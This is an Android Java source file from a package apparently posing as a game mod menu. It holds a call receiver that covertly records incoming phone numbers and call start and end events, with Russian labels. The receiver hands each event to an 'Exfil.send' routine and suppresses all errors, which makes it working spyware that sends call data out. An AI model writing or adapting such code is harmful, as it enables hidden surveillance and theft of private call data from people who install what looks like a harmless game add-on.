package com.brawl.modmenu;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

public class CallReceiver extends BroadcastReceiver {

    private static String lastState = "";
    private static String lastNumber = "";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        try {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            if (state == null) return;

            if (number != null && !number.isEmpty()) lastNumber = number;

            String event = null;
            if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
                event = "📞 Входящий: " + lastNumber;
            } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                event = "🟢 Звонок принят: " + lastNumber;
            } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)
                && "OFFHOOK".equals(lastState)) {
                event = "🔴 Звонок завершён: " + lastNumber;
                lastNumber = "";
            }

            lastState = state;
            if (event != null) Exfil.send("CALL", event);

        } catch (Throwable ignored) {}
    }
}
